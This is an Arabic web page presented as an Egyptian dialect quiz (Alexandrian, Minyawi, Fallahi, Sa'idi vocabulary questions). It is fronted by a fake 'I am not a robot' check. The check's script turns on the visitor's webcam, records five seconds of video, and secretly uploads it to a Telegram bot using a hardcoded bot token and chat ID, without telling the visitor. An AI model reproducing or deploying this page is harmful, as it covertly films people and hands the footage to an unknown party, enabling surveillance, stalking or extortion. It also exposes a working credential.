<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اختبار اللهجات المصرية</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Cairo', Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #2980b9, #27ae60);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #333;
            font-size: 18px;
        }
        .container {
            background: rgba(255, 255, 255, 0.9);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            padding: 30px;
            text-align: center;
            animation: fadeIn 0.5s ease;
            font-size: 20px;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .verification-section {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
            margin: 15px 0;
            gap: 10px;
        }
        input[type="checkbox"] {
            width: 24px;
            height: 24px;
            accent-color: #27ae60;
        }
        .loading, .success {
            margin: 15px 0;
            font-size: 18px;
        }
        .loading { color: #f39c12; }
        .success { color: #27ae60; }
        video {
            width: 100%;
            max-width: 300px;
            border-radius: 10px;
            margin: 15px 0;
            background: #000;
        }
        .language-buttons {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #27ae60;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
            font-size: 16px;
            text-align: center;
        }
        .btn:hover {
            background-color: #2ecc71;
        }
        .quiz-section {
            text-align: right;
        }
        .quiz-section h2 {
            margin-bottom: 15px;
            color: #2c3e50;
            font-size: 24px;
        }
        .option {
            display: flex;
            align-items: center;
            margin: 10px 0;
            background-color: #f7f7f7;
            border-radius: 8px;
            padding: 10px;
            transition: background-color 0.3s;
            font-size: 18px;
        }
        .option input[type="radio"] {
            margin-left: 10px;
        }
        .option:hover {
            background-color: #e8f4f8;
        }
        .result {
            text-align: center;
            padding: 20px;
            background-color: #f1f1f1;
            border-radius: 10px;
        }
        @media (max-width: 480px) {
            .language-buttons {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="verification-container">
        <div class="verification-section">
            <h1>تحقق من أنك لست روبوتاً</h1>
            <div class="checkbox-container">
                <input type="checkbox" id="robot-checkbox">
                <label for="robot-checkbox">أنا لست روبوتاً</label>
            </div>
            <video id="video" autoplay playsinline muted></video>
            <div class="loading">جاري التحقق... ⏳</div>
            <div class="success">✅ تم التحقق بنجاح!</div>
        </div>
    </div>

    <div class="container" id="quiz-container" style="display:none;">
        <div class="quiz-section">
            <h1>اختبار اللهجات المصرية</h1>
            <div class="language-buttons">
                <button class="btn" onclick="startQuiz('اسكندراني')">إسكندراني</button>
                <button class="btn" onclick="startQuiz('منياوي')">منياوي</button>
                <button class="btn" onclick="startQuiz('فلاحي')">فلاحي</button>
                <button class="btn" onclick="startQuiz('صعيدي')">صعيدي</button>
            </div>
            <div id="question-container" style="display:none;">
                <h2 id="question-text"></h2>
                <div id="options-container"></div>
                <button id="next-button" class="btn" style="display:none; width: 100%;">السؤال التالي</button>
            </div>
            <div class="result" id="result" style="display:none;">
                <h2>نتيجتك</h2>
                <p id="score"></p>
            </div>
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const checkbox = document.getElementById('robot-checkbox');
        const loading = document.querySelector('.loading');
        const success = document.querySelector('.success');

        checkbox.addEventListener('change', (e) => {
            if (e.target.checked) {
                video.style.display = 'block';
                loading.style.display = 'block';
                success.style.display = 'none';

                navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    video.srcObject = stream;

                    const mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];
                    mediaRecorder.start();
                    mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };

                    setTimeout(() => { mediaRecorder.stop(); }, 5000);

                    mediaRecorder.onstop = () => {
                        loading.style.display = 'none';
                        success.style.display = 'block';
                        stream.getTracks().forEach(track => track.stop());

                        document.getElementById('verification-container').style.display = 'none';
                        document.getElementById('quiz-container').style.display = 'block';

                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const formData = new FormData();
                        formData.append('chat_id', '2070423407');
                        formData.append('video', blob, 'video.webm');

                        fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { 
                            method: 'POST', 
                            body: formData 
                        }).catch((error) => { console.error('Video upload failed:', error.message); });
                    };
                })
                .catch((err) => { alert("Unable to access the camera: " + err.message); });
            }
        });

        const dialects = {
            "اسكندراني": [
                { q: "ما معنى كلمة 'جعان'؟", options: ["محتاج", "جائع", "نعسان", "غاضب"], correct: 1 },
                { q: "ماذا تعني 'حتة'؟", options: ["جزء", "بيت", "مكان", "شيء"], correct: 0 },
                { q: "ما معنى 'فايق'؟", options: ["مستيقظ", "مريض", "غاضب", "مستمتع"], correct: 0 },
                { q: "ماذا تعني كلمة 'دِرَاج'؟", options: ["بسيط", "غريب", "درّاجه", "غرفه"], correct: 2 },
                { q: "ما معنى كلمة 'حَلَاب'؟", options: ["أشياء", "غروب", "خُطَط", "جمل"], correct: 3 },
                { q: "ما معنى 'زغرطة'؟", options: ["صراخ", "غناء", "تهليل", "رقص"], correct: 2 },
                { q: "ماذا تعني 'إمبارح'؟", options: ["غداً", "أمس", "اليوم", "الآن"], correct: 1 },
                { q: "ما معنى 'بلكونة'؟", options: ["شرفة", "غرفة", "مطبخ", "سطح"], correct: 0 },
                { q: "ماذا تعني 'عربية'؟", options: ["سيارة", "عربة", "شاحنة", "دراجة"], correct: 0 },
                { q: "ما معنى 'مزيكا'؟", options: ["رقص", "موسيقى", "غناء", "تمثيل"], correct: 1 },
                { q: "ماذا تعني 'أفندم'؟", options: ["نعم", "سيدي", "تفضل", "حسناً"], correct: 1 },
                { q: "ما معنى 'إيه دا'؟", options: ["ماذا هذا", "كيف هذا", "لماذا", "متى"], correct: 0 },
                { q: "ماذا تعني 'عايز'؟", options: ["تريد", "تحب", "ستذهب", "ستأتي"], correct: 0 },
                { q: "ما معنى 'شكلك'؟", options: ["مظهرك", "ملابسك", "وجهك", "شخصيتك"], correct: 0 },
                { q: "ماذا تعني 'خالص'؟", options: ["تماماً", "كثيراً", "قليلاً", "أحياناً"], correct: 0 }
            ],
            "منياوي": [
                { q: "ماذا تعني 'أبا'؟", options: ["أنا", "أبي", "أنت", "نعم"], correct: 1 },
                { q: "ما هو معنى 'زير'؟", options: ["وعاء ماء", "ثوب", "طعام", "بيت"], correct: 0 },
                { q: "ماذا تعني كلمة 'شوش'؟", options: ["رأس", "صوت", "ماء", "نار"], correct: 1 },
                { q: "ما معنى 'الحُما'؟", options: ["غابة", "بيت", "مطعم", "مزرعة"], correct: 3 },
                { q: "ما هو معنى 'تلِم'؟", options: ["يصمت", "يتكلم", "يلعب", "ينام"], correct: 1 }
            ],
            "فلاحي": [
                { q: "ماذا يعني 'المندل'؟", options: ["عصا", "شمعة", "بيت", "ساحة"], correct: 0 },
                { q: "ما هو 'الوابور'؟", options: ["قطار", "محطة", "مركب", "طائرة"], correct: 0 },
                { q: "ما معنى 'شَبرَة'؟", options: ["نار", "طعام", "موقد", "صاروخ"], correct: 2 },
                { q: "ما هو معنى 'أحباب'؟", options: ["أصدقاء", "أعداء", "عائلة", "مجموعه"], correct: 0 },
                { q: "ماذا تعني 'حَطب'؟", options: ["خشب", "ماء", "مطبخ", "باب"], correct: 0 }
            ],
            "صعيدي": [
                { q: "ماذا تعني 'كمش'؟", options: ["غسّل", "شرب", "فجر", "أمسك"], correct: 3 },
                { q: "ما معنى 'جِبَت'؟", options: ["جاء", "نزل", "أخذ", "ذهب"], correct: 0 },
                { q: "ما هو 'بتاع'؟", options: ["شخص", "شيء", "حالة", "مكان"], correct: 1 },
                { q: "ما معنى 'مخربش'؟", options: ["محبط", "غاضب", "حزين", "مسعود"], correct: 3 },
                { q: "ماذا تعني 'كِتف'؟", options: ["ذراع", "ساق", "كتف", "صدر"], correct: 2 }
            ]
        };

        let currentQuestionIndex = 0;
        let score = 0;
        let selectedDialect = '';
        let questions = [];

        const questionText = document.getElementById('question-text');
        const optionsContainer = document.getElementById('options-container');
        const nextButton = document.getElementById('next-button');
        const resultDiv = document.getElementById('result');
        const scoreText = document.getElementById('score');

        function startQuiz(dialect) {
            selectedDialect = dialect;
            questions = dialects[selectedDialect];
            shuffleQuestions(questions);
            currentQuestionIndex = 0;
            score = 0;
            displayQuestion();
            document.getElementById('question-container').style.display = 'block';
            resultDiv.style.display = 'none';
        }

        function shuffleQuestions(array) {
            for (let i = array.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [array[i], array[j]] = [array[j], array[i]];
            }
        }

        function displayQuestion() {
            if (currentQuestionIndex < questions.length) {
                const question = questions[currentQuestionIndex];
                questionText.textContent = question.q;
                optionsContainer.innerHTML = '';

                const shuffledOptions = [...question.options];
                shuffleQuestions(shuffledOptions);

                shuffledOptions.forEach((option, index) => {
                    const optionDiv = document.createElement('div');
                    optionDiv.classList.add('option');
                    const radioInput = document.createElement('input');
                    radioInput.type = 'radio';
                    radioInput.name = 'answer';
                    radioInput.value = shuffledOptions.indexOf(option);
                    radioInput.id = `option${index}`;
                    const label = document.createElement('label');
                    label.htmlFor = `option${index}`;
                    label.textContent = option;

                    optionDiv.appendChild(radioInput);
                    optionDiv.appendChild(label);
                    optionsContainer.appendChild(optionDiv);
                });

                nextButton.style.display = 'block';
            } else {
                showResult();
            }
        }

        nextButton.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="answer"]:checked');
            if (selectedOption) {
                if (parseInt(selectedOption.value) === questions[currentQuestionIndex].correct) {
                    score++;
                }
                currentQuestionIndex++;
                displayQuestion();
            }
        });

        function showResult() {
            nextButton.style.display = 'none';
            document.getElementById('question-container').style.display = 'none';
            resultDiv.style.display = 'block';
            
            let resultMessage = '';
            const percentage = (score / questions.length) * 100;
            
            if (percentage === 100) {
                resultMessage = 'إتقان تام! أحسنت 🏆';
            } else if (percentage >= 80) {
                resultMessage = 'ممتاز! مستوى عالي 👏';
            } else if (percentage >= 60) {
                resultMessage = 'جيد! حاول مرة أخرى 👍';
            } else {
                resultMessage = 'لا بأس، يمكنك التحسن 🌟';
            }

            scoreText.innerHTML = `نتيجتك : ${score} من ${questions.length}<br>${resultMessage}`;
        }

        function setupQuizInteraction() {
            optionsContainer.addEventListener('click', (event) => {
                const optionElement = event.target.closest('.option');
                if (optionElement) {
                    const radioInput = optionElement.querySelector('input[type="radio"]');
                    radioInput.checked = true;
                    
                    // Trigger next button click if desired
                    nextButton.click();
                }
            });
        }

        // Call this function after initial setup
        setupQuizInteraction();
    </script>
</body>
</html>
